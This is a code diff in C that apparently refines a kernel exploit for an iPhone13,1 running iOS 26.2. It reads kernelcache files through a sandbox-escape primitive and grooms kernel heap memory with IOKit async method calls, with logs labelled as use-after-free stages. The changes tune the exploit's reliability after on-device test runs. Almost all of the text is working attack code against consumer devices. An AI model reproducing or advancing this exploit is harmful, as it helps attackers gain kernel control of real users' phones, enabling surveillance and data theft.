@@ -822,12 +822,18 @@ static void stageKCE(void) {
     // device as iPhone13,1 - so go straight for the fileset kernelcache by
     // candidate filename, each with its OWN escape handle (file-scoped grants).
     const char *cands[] = {
+        // the naming is the IPSW's, not the model-with-comma: the local restore
+        // image D:\iPhone13,1_26.2_23C55_Restore.ipsw carries
+        // kernelcache.release.iphone13 (verified offline), while the
+        // iphone13,1 candidates all returned ENOENT on the device
+        "/System/Library/Caches/com.apple.kernelcaches/kernelcache.release.iphone13",
+        "/System/Library/Caches/com.apple.kernelcaches/kernelcache.development.iphone13",
         "/System/Library/Caches/com.apple.kernelcaches/kernelcache.release.iphone13,1",
         "/System/Library/Caches/com.apple.kernelcaches/kernelcache.development.iphone13,1",
         "/System/Library/Caches/com.apple.kernelcaches/kernelcache.release.d23ap",
         "/System/Library/Caches/com.apple.kernelcaches/kernelcache.release.d52p",
         "/System/Library/Caches/com.apple.kernelcaches/kernelcache",
-        "/System/Library/Caches/kernelcache.release.iphone13,1",
+        "/System/Library/Caches/kernelcache.release.iphone13",
         NULL };
     for (int ci = 0; cands[ci]; ci++) {
         int64_t h = sbxRead(cands[ci]);
@@ -1311,7 +1317,16 @@ static uint64_t gHoldIds[512];
 static int gHoldN = 0;
 
 static void holdFree(void) {
-    for (int i = 0; i < gHoldN; i++) dropPort(gHoldPorts[i]);
+    // dereg the held entries BEFORE dropping their wakeports: an entry whose
+    // async op is still pending keeps a reference on the user client, and the
+    // device run showed later rounds failing 0xC9 on fresh keys (unit 1 after
+    // unit 0) - consistent with the connection being out of in-flight async
+    // registrations rather than with the keys themselves.
+    for (int i = 0; i < gHoldN; i++) {
+        uint64_t out[3] = { gHoldIds[i], 0x1122334455667788ull, CANARY_F5 };
+        if (gGroomConn) callSel(gGroomConn, SEL_DEREG, out, 24, 0, MACH_PORT_NULL);
+        dropPort(gHoldPorts[i]);
+    }
     gHoldN = 0;
 }
 
@@ -1323,6 +1338,7 @@ static int holdGroom(int n, uint32_t tag) {
     }
     uint64_t ref = 0xA1B2C3D4E5F60708ull;
     int bad = 0;
+    uint64_t id = 0xC0FFEE5A00000000ull | (0x24ull << 16) | ((tag * 1024 + 0) & 0xffff);
     for (int i = 0; i < n && gHoldN < 512; i++) {
         mach_port_t wp = newWakePort();
         if (!wp) break;
@@ -1330,7 +1346,7 @@ static int holdGroom(int n, uint32_t tag) {
         // varying only in[0] gave one insert and then 0xC9 (InternalError) on
         // every call, while in[1]=2 in stage B worked.  So: unique in[1] per
         // call (the canary id still rides in in[0] and in[2] for the dump).
-        uint64_t id = 0xC0FFEE5A00000000ull | (0x24ull << 16) | ((tag * 1024 + (uint32_t)i) & 0xffff);
+        id = 0xC0FFEE5A00000000ull | (0x24ull << 16) | ((tag * 1024 + (uint32_t)i) & 0xffff);
         uint64_t in[3] = { id, 0x5151000000000000ull | (tag * 4096 + (uint32_t)i), CANARY_F5 };
         kern_return_t r = IOConnectCallAsyncMethod(gGroomConn, SEL_REG, wp, &ref, 1,
                                                    NULL, 0, in, 24, NULL, NULL, NULL, NULL);
@@ -1342,8 +1358,29 @@ static int holdGroom(int n, uint32_t tag) {
             continue;
         }
         gHoldPorts[gHoldN] = wp;
-        gHoldIds[gHoldN] = id;
+        gHoldIds[gHoldN] = in[1];      // the registry KEY (in[1]), for the dereg
         gHoldN++;
+    }
+    // a round that loses most of its inserts gets a FRESH connection: the
+    // device run showed unit 1 (after unit 0) failing every fresh key, which
+    // points at per-connection in-flight state, not the keys
+    if (bad * 2 > n && gHoldN == 0) {
+        EV("[uaf][P2] holdGroom: %d/%d inserts failed - reopening the groom connection", bad, n);
+        if (gGroomConn) { IOServiceClose(gGroomConn); gGroomConn = 0; }
+        if (IOServiceOpen(gSvc, mach_task_self(), 0, &gGroomConn) == KERN_SUCCESS) {
+            for (int i = 0; i < n && gHoldN < 512; i++) {
+                mach_port_t wp = newWakePort();
+                if (!wp) break;
+                uint64_t in[3] = { id, 0x5151000000000000ull | (tag * 4096 + (uint32_t)i), CANARY_F5 };
+                uint64_t ref = 0xA1B2C3D4E5F60708ull;
+                kern_return_t r2 = IOConnectCallAsyncMethod(gGroomConn, SEL_REG, wp, &ref, 1,
+                                                            NULL, 0, in, 24, NULL, NULL, NULL, NULL);
+                if (r2 != KERN_SUCCESS) { dropPort(wp); continue; }
+                gHoldPorts[gHoldN] = wp;
+                gHoldIds[gHoldN] = in[1];
+                gHoldN++;
+            }
+        }
     }
     return gHoldN;
 }
